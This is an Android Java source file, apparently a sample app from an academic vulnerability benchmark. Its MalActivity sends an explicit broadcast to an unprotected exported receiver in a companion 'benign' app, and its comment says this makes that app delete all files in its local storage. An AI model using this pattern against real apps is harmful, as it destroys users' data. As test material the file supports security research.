package edu.ksu.cs.malicious;

import android.content.Intent;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;

/*
This app contains a malicious activity that
invokes an unprotected exported broadcast receiver
(expecting a system broadcast) via an explicit intent
and deletes all files in its local storage.
*/
public class MalActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_mal);
    }

    @Override
    protected void onResume(){
        super.onResume();
        Intent i = new Intent();
        i.setPackage("edu.ksu.cs.benign");
        i.setClassName("edu.ksu.cs.benign","edu.ksu.cs.benign.LowMemoryReceiver");
        sendBroadcast(i);
        Log.d("Malicious","after broadcast");

    }
}
